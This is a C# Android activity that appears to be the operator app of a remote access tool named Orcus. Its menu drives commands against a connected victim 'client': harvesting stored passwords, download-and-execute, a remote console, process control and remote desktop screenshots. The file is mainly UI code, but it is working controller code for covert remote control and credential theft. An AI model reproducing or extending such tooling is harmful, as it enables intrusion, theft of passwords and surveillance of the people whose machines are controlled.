
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using Mikepenz.MaterialDrawer;
using Mikepenz.MaterialDrawer.Models;
using Mikepenz.Typeface;
using Mikepenz.MaterialDrawer.Utils;
using Android.Support.V7.Widget;
using Java.IO;
using Android.Graphics;
using System.IO;
using Orcus.Shared.Connection;

namespace Orcus.Administration.App
{
	[Activity (Label = "Client", Theme = "@style/DrawerAppTheme")]			
	public class MainActivity : Activity, Mikepenz.MaterialDrawer.Drawer.IOnDrawerItemClickListener
	{
		private ClientController _controller;
		private Drawer result;
		private Android.Support.V7.Widget.Toolbar toolbar = null;
		private SpecialTab _specialTab;
		private List<Fragment> _fragments;

		protected override void OnCreate (Bundle savedInstanceState)
		{
			base.OnCreate (savedInstanceState);

			// Create your application here
			_controller = ConnectionManager.Current.CurrentController;
			SetContentView(Resource.Layout.MainDrawerLayout);

			this.Window.SetTitle (string.Format("{0} - {1}", _controller.Client.UserName, _controller.Client.IpAddress));

			_fragments = new List<Fragment> {
				new HomeFragment (),
				new FunFragment (),
				new TaskManagerFragment (),
				new PasswordFragment (),
				new DownloadAndExecuteFragment (),
				new ConsoleFragment (),
				new RemoteDesktopFragment ()
			};

			toolbar = this.FindViewById<Android.Support.V7.Widget.Toolbar>(Resource.Id.toolbar);

			var headerResult = new AccountHeaderBuilder ()
				.WithActivity (this)
				.WithHeaderBackground (Resource.Drawable.header)
				.Build ();

			var homeItem = new PrimaryDrawerItem();
			homeItem.WithName("Home");
			homeItem.WithIdentifier(0);
			homeItem.WithIcon(FontAwesome.Icon.FawHome);
			homeItem.WithTag ("Home");

			var funItem = new PrimaryDrawerItem();
			funItem.WithName("Fun");
			funItem.WithIdentifier(1);
			funItem.WithIcon(FontAwesome.Icon.FawMagic);
			funItem.WithTag ("Fun");

			var taskManagerItem = new PrimaryDrawerItem();
			taskManagerItem.WithName("Task manager");
			taskManagerItem.WithIdentifier(2);
			taskManagerItem.WithIcon(FontAwesome.Icon.FawCogs);
			taskManagerItem.WithTag ("Task manager");

			var passwordsItem = new PrimaryDrawerItem();
			passwordsItem.WithName("Passwords");
			passwordsItem.WithIdentifier(3);
			passwordsItem.WithIcon(FontAwesome.Icon.FawKey);
			passwordsItem.WithTag ("Passwords");

			var downloadExecuteItem = new PrimaryDrawerItem();
			downloadExecuteItem.WithName("Download & Execute");
			downloadExecuteItem.WithIdentifier(4);
			downloadExecuteItem.WithIcon(FontAwesome.Icon.FawDownload);
			downloadExecuteItem.WithTag ("Download & Execute");

			var consoleItem = new PrimaryDrawerItem();
			consoleItem.WithName("Console");
			consoleItem.WithIdentifier(5);
			consoleItem.WithIcon(FontAwesome.Icon.FawTerminal);
			consoleItem.WithTag ("Console");

			var remoteDesktopItem = new PrimaryDrawerItem ();
			remoteDesktopItem.WithName ("Remote Desktop");
			remoteDesktopItem.WithIdentifier (6);
			remoteDesktopItem.WithIcon (FontAwesome.Icon.FawDesktop);
			remoteDesktopItem.WithTag ("Remote Desktop");

			result = new DrawerBuilder()
				.WithActivity(this)
				.WithToolbar(toolbar)
				.WithAccountHeader(headerResult)
				.AddDrawerItems(
					homeItem,
					new DividerDrawerItem(),
					funItem,
					taskManagerItem,
					passwordsItem,
					downloadExecuteItem,
					consoleItem,
					new DividerDrawerItem(),
					remoteDesktopItem
				) // add the items we want to use With our Drawer
				.WithOnDrawerItemClickListener(this)
				.WithSavedInstance(savedInstanceState)
				.WithShowDrawerOnFirstLaunch(true)
				.Build();

			RecyclerViewCacheUtil.Instance.WithCacheSize(2).Init(result);

			if (savedInstanceState == null) {
				// set the selection to the item with the identifier 1
				result.SetSelection (0, true);
			} else {
				result.SetSelection (result.CurrentSelection, true);
			}

			ConnectionManager.Current.ClientDisconnected += ConnectionManager_Current_ClientDisconnected;
			ConnectionManager.Current.Disconnected += ConnectionManager_Current_Disconnected;
			toolbar.MenuItemClick += Toolbar_MenuItemClick;

			Window.SetSoftInputMode (SoftInput.AdjustPan);
		}

		void ConnectionManager_Current_Disconnected (object sender, EventArgs e)
		{
			Finish ();
		}

		void ConnectionManager_Current_ClientDisconnected (object sender, LightClientInformationApp e)
		{
			if (e.Id == _controller.Client.Id)
				Finish ();
		}

		public override void OnSaveInstanceState (Bundle outState, PersistableBundle outPersistentState)
		{
			base.OnSaveInstanceState (outState, outPersistentState);
			outState.PutInt ("selectedItem", result.CurrentSelection);
		}

		public bool OnItemClick (View view, int position, Mikepenz.MaterialDrawer.Models.Interfaces.IDrawerItem drawerItem)
		{
			if (drawerItem != null) {
				Android.App.Fragment fragment = null;

				toolbar.Menu.Clear ();
				_specialTab = SpecialTab.None;

				switch (drawerItem.Identifier) {
				case 0:
					fragment = _fragments.OfType<HomeFragment>().First();
					break;
				case 1:
					fragment = _fragments.OfType<FunFragment>().First();
					break;
				case 2:
					fragment = _fragments.OfType<TaskManagerFragment> ().First ();
					toolbar.InflateMenu (Resource.Menu.RefreshMenu);
					_specialTab = SpecialTab.TaskManager;
					break;
				case 3:
					fragment = _fragments.OfType<PasswordFragment> ().First ();
					toolbar.InflateMenu (Resource.Menu.RefreshMenu);
					_specialTab = SpecialTab.Passwords;
					break;
				case 4:
					fragment = _fragments.OfType<DownloadAndExecuteFragment>().First();
					break;
				case 5:
					fragment = _fragments.OfType<ConsoleFragment>().First();
					toolbar.InflateMenu (Resource.Menu.SwitchMenu);

					var menuItem = (SwitchCompat)toolbar.Menu.FindItem (Resource.Id.switchId).ActionView.FindViewById (Resource.Id.switchForActionBar);
					menuItem.Checked = ConnectionManager.Current.CurrentController.Commander.GetCommand<ConsoleCommand> ().IsEnabled;
					menuItem.CheckedChange += MenuItem_CheckedChange;
					break;
				case 6:
					fragment = _fragments.OfType<RemoteDesktopFragment>().First();
					toolbar.InflateMenu (Resource.Menu.TakeImageMenu);
					_specialTab = SpecialTab.RemoteDesktop;
					break;
				default:
					return false;
				}

				FragmentManager.BeginTransaction ().Replace (Resource.Id.frame_container, fragment).Commit ();
				result.CloseDrawer ();
				FindViewById<Android.Support.V7.Widget.Toolbar>(Resource.Id.toolbar).Title = drawerItem.Tag.ToString ();
				return true;
			}

			return false;
		}

		void MenuItem_CheckedChange (object sender, CompoundButton.CheckedChangeEventArgs e)
		{
			if (e.IsChecked) {
				ConnectionManager.Current.CurrentController.Commander.GetCommand<ConsoleCommand> ().Start ();
				Toast.MakeText (this, "Starting console...", ToastLength.Short).Show ();
			} else {
				ConnectionManager.Current.CurrentController.Commander.GetCommand<ConsoleCommand> ().Stop ();
				Toast.MakeText (this, "Stopping console...", ToastLength.Short).Show ();
			}
		}

		void Toolbar_MenuItemClick (object sender, Android.Support.V7.Widget.Toolbar.MenuItemClickEventArgs e)
		{
			var x =	e.Item.ItemId;

			switch (_specialTab) {
			case SpecialTab.TaskManager:
				ConnectionManager.Current.CurrentController.Commander.GetCommand<TaskManagerCommand> ().Refresh ();
				Toast.MakeText (this, "Refreshing task list...", ToastLength.Short).Show ();
				break;
			case SpecialTab.Passwords:
				ConnectionManager.Current.CurrentController.Commander.GetCommand<PasswordCommand> ().GetPasswords ();
				Toast.MakeText (this, "Get passwords...", ToastLength.Short).Show ();
				break;
			case SpecialTab.RemoteDesktop:
				if (e.Item.Icon == null) {
					ConnectionManager.Current.CurrentController.Commander.GetCommand<RemoteDesktopCommand> ().TakeScreenshot ();
					Toast.MakeText (this, "Get screenshot...", ToastLength.Short).Show ();
				} else {
					var image = ConnectionManager.Current.CurrentController.Commander.GetCommand<RemoteDesktopCommand> ().CurrentImage;
					if (image == null)
						break;

					var shareIntent = new Intent (Intent.ActionSend);
					shareIntent.SetType("image/jpeg");
					using (var byteStream = new MemoryStream ()) {
						image.Compress (Bitmap.CompressFormat.Jpeg, 100, byteStream);

						var file = new Java.IO.File (Android.OS.Environment.ExternalStorageDirectory + Java.IO.File.Separator + "RemoteDesktop.jpg");
						try {
							file.CreateNewFile();
							using(var fo = new FileOutputStream(file))
								fo.Write(byteStream.ToArray());
						} catch (Exception ex) {
							Toast.MakeText (this, "Error creating temporary file: " + ex.Message, ToastLength.Short).Show ();
							break;
						}
						shareIntent.PutExtra (Intent.ExtraStream, Android.Net.Uri.Parse (@"file:///sdcard/RemoteDesktop.jpg"));
					}

					StartActivity (Intent.CreateChooser (shareIntent, "Share Image"));
				}
				break;
			}

		}

		public override void OnBackPressed()
		{
			//handle the back press :D close the drawer first and if the drawer is closed close the activity
			if (result != null && result.IsDrawerOpen) {
				result.CloseDrawer();
			} else {
				base.OnBackPressed();
			}
		}

		protected override void OnSaveInstanceState(Bundle outState)
		{
			//add the values which need to be saved from the drawer to the bundle
			outState = result.SaveInstanceState(outState);
			base.OnSaveInstanceState(outState);
		}
	}

	public enum SpecialTab{
		None,
		TaskManager,
		Passwords,
		RemoteDesktop
	}
}